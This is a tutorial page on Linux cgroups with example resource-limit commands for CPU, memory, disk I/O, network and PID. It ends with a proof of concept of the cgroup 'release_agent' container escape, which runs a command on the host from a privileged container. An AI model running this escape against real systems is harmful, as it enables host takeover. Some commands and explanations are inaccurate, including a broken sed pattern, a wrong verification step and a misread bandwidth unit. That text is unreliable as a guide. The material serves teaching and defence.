---
title: " 5.Cgroups "
description: "Linux Container Cgroups "
weight : 5
---

# Cgroups
<br>
Cgroups, also known as control groups, are a Linux kernel feature that allows administrators to limit, prioritize, and allocate resources such as CPU, memory, and I/O bandwidth to a group of processes.

In a container environment, Cgroups are used to ensure that each container has its own set of resources and cannot interfere with other containers or the host system. This helps to isolate the containers from each other and allows them to run in a more predictable and stable manner.

Cgroups can be used to set limits on the amount of resources a container can use, such as CPU time or memory usage. This ensures that a single container cannot monopolize resources and negatively impact the performance of other containers or the host system.

Cgroups are a key component in containerization technologies such as Docker and Kubernetes, which use them to manage and allocate resources for containers. They help to ensure that containers have the resources they need to run effectively, while also preventing resource contention between containers.


There are several types of cgroups (control groups) that can be used in a container:

1.CPU: This cgroup limits the amount of CPU resources available to a container. It can be used to ensure that a container does not consume too much CPU time, which can impact the performance of other containers or the host machine.

2.Memory: This cgroup limits the amount of memory available to a container. It can be used to prevent a container from consuming too much memory, which can cause the host machine to run out of available memory.
3.Disk I/O: This cgroup limits the amount of disk I/O (input/output) available to a container. It can be used to ensure that a container does not consume too much disk I/O, which can impact the performance of other containers or the host machine.
4.Network: This cgroup limits the amount of network bandwidth available to a container. It can be used to ensure that a container does not consume too much network bandwidth, which can impact the performance of other containers or the host machine.
5.PID: This cgroup limits the number of processes that a container can run. It can be used to prevent a container from creating too many processes, which can impact the performance of other containers or the host machine.


# CPU Cgroup with example 
<br>
A CPU Cgroup (Control Group) is a Linux kernel feature that allows the administrator to limit, prioritize, and allocate CPU resources to specific groups of processes or containers. This helps to ensure that a single container or group of processes does not consume too much CPU resources and cause resource contention with other containers or processes on the system.

To illustrate this with a hands-on example, let's say we have two containers running on our system: Container A and Container B. We want to allocate 50% of the CPU resources to Container A and the remaining 50% to Container B.

To do this, we can use the "cgcreate" command to create a new CPU Cgroup for Container A:

```bash
$ cgcreate -g cpu:/container_a

```
Next, we can use the "cgset" command to specify the CPU resources that Container A is allowed to use:

```bash
$ cgset -r cpu.cfs_quota_us=50000 container_a

```

This sets the CPU quota for Container A to 50,000 microseconds (50% of the available CPU resources).

Finally, we can use the "cgclassify" command to assign the processes running in Container A to this Cgroup:

```bash
$ cgclassify -g cpu:/container_a $(pidof <process name>)

```

This will ensure that the processes running in Container A are only allowed to use up to 50% of the CPU resources.

We can repeat this process for Container B to allocate the remaining 50% of CPU resources to it.

By using CPU Cgroups, we can effectively control and allocate CPU resources to different containers and processes on our system, ensuring that each container or process gets the resources it needs without causing resource contention.


# Memory Cgroup with example 
<br>

Memory Cgroups (control groups) are a Linux kernel feature that allow administrators to allocate and limit the amount of memory resources available to a group of processes. This is particularly useful in the context of containers, where the containerized applications are isolated from the host system and can potentially consume all available memory resources.

For example, consider a situation where a containerized application is running on a host with 8 GB of memory. Without memory Cgroups, the application could potentially consume all 8 GB of memory, potentially causing other processes on the host to crash or experience performance issues.

To address this issue, an administrator can use memory Cgroups to limit the amount of memory available to the containerized application. For example, the administrator could specify that the containerized application is only allowed to use 4 GB of memory. If the application attempts to consume more than 4 GB of memory, it will be killed by the kernel.

To demonstrate this concept with a hands-on example, we can use the "docker" command to run a containerized application and specify a memory limit using the `--memory` flag. For example:

```bash
docker run --memory 4g my_containerized_app

```

This command will run the containerized application `my_containerized_app` and limit it to using a maximum of 4 GB of memory. If the application attempts to consume more than 4 GB of memory, it will be killed by the kernel.

# Disk I/O Cgroup with example
<br>
A Disk I/O Cgroup is a Linux kernel feature that allows administrators to set limits on the amount of disk input/output (I/O) a group of processes can perform. This can be useful in a container environment, as it allows administrators to ensure that one container or group of containers does not consume too many resources and negatively impact the performance of other containers or the host system.

To create a Disk I/O Cgroup in a container environment, you will need to have a container runtime that supports Cgroups, such as Docker or Kubernetes.

Here is a hands-on example using Docker:

1. Run the following command to create a new container named "my-container" with a Disk I/O Cgroup limit of 100 kilobytes per second (KB/s):

```bash
docker run -it --name my-container --cgroup-parent my-cgroup 
--device-read-bps /dev/sda:100000 --device-write-bps /dev/sda:100000 ubuntu


```


Once the container is running, you can use the cgclassify command to verify that the Disk I/O Cgroup limit has been applied:

```bash
cgclassify -g blkio:/my-cgroup/my-container

```
You can also use the cgtop command to monitor the Disk I/O usage of the container in real-time:

```bash
cgtop -d 1 -c 2 -g blkio

```

his will display a list of all containers with Disk I/O Cgroups, along with their usage and limits. In this example, you should see "my-container" listed with a limit of 100 KB/s.

By setting Disk I/O limits for containers, you can ensure that each container has the resources it needs to perform its tasks without impacting the performance of other containers or the host system. This can help to improve the overall performance and stability of your container environment.


# Network Cgroup with example
<br>
Network Cgroup is a Linux kernel feature that allows the administrator to limit, prioritize, and control network resources for a group of processes. In the context of containers, Network Cgroup can be used to limit the amount of bandwidth, number of connections, and other network resources that a container can use.

For example, consider a scenario where you have a container running a web server. You may want to limit the amount of bandwidth the container can use to prevent it from consuming too much of the available network resources. To do this, you can use Network Cgroup to set a bandwidth limit for the container.

To demonstrate this with a hands-on example, let's first create a new container using Docker:

```bash
$ docker run -it --name web-server ubuntu
```

Next, we will use the `cgcreate` command to create a new Network Cgroup for our container:

```bash
$ cgcreate -g net_cls:web-server

```

This will create a new Network Cgroup named web-server that we can use to limit the network resources of our container.

To set a bandwidth limit for our container, we can use the tc command to create a new traffic control class and attach it to our Network Cgroup:

```bash
$ tc class add dev eth0 parent 1:1 classid 1:10 htb rate 1mbps
$ cgset -r net_cls.classid=1:10 web-server

```
This will limit the container to using 1Mbps of bandwidth. If the container tries to use more bandwidth than this, it will be throttled by the kernel.

We can verify that the bandwidth limit is in place by using the tc command to show the traffic control classes:

```bash
$ tc -s class show dev eth0

```

This will show all of the traffic control classes on the eth0 interface, including the one we just created for our container.

In this example, we demonstrated how to use Network Cgroup to limit the bandwidth used by a container. However, Network Cgroup can also be used to control other network resources, such as the number of connections, packet rate, and more.


# PID Cgroup with example
<br>
PID stands for "Process ID" and is a unique identifier assigned to each process running on a computer. A PID allows the system to identify and manage each process individually.

Cgroup stands for "Control Group" and is a Linux kernel feature that allows the system to allocate resources (such as CPU and memory) to a group of processes. This allows the system to prioritize or limit the resource usage of certain processes.

In a container, PID and Cgroup are used to isolate processes and resources within the container. For example, if we have a container running a web server, we can assign a specific PID and Cgroup to that container to ensure that the web server has access to the necessary resources and is not impacted by other processes running on the system.

Here is a hands-on example of using PID and Cgroup in a container:

Start a new container using the docker run command, specifying the image and any necessary arguments:

```bash
docker run -d --name my-web-server -p 8080:80 nginx


```
Check the PID of the main process inside the container by running the following command:

```bash
docker exec my-web-server ps -aux


```
This will display a list of processes running inside the container, including the PID of the main process (in this case, the nginx web server).

Check the Cgroup of the container by running the following command:

```bash

cat /sys/fs/cgroup/memory/docker/[CONTAINER ID]/memory.usage_in_bytes


```


This will display the current memory usage of the container in bytes.

By using PID and Cgroup, we can ensure that the processes and resources within the container are properly isolated and managed.



# Created Group release agent (container escape).
<br>
MITRE: Privilege Escalation

The PoC relied on another misconfiguration where the container has elevated privileges, either by the `--privileged` flag or the apparmor=unconfined flag. The escape can be triggered by an exploit using the Linux cgroups (control groups) mechanism and a ‘release_agent’ file.

Linux control groups are intended to allow multiple Docker containers to run in isolation while limiting and monitoring their use of resources. However, the ‘release_agent’ file contains a command that is executed by the kernel with full privileges on the host once the last task in a cgroup terminates. The PoC abuses this functionality by creating a ‘release_agent’ file with a malicious command, and then killing off all the tasks in the cgroup.

As the cgroup files are present both in the container and on the host, it is possible to modify them from either, which means an attacker can spawn a process inside the cgroup and gain code execution on the host.


```bash
# On the host

docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# In the container
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*perdir=([^,]*).*/1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd

sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"


```

MITRE: Privilege Escalation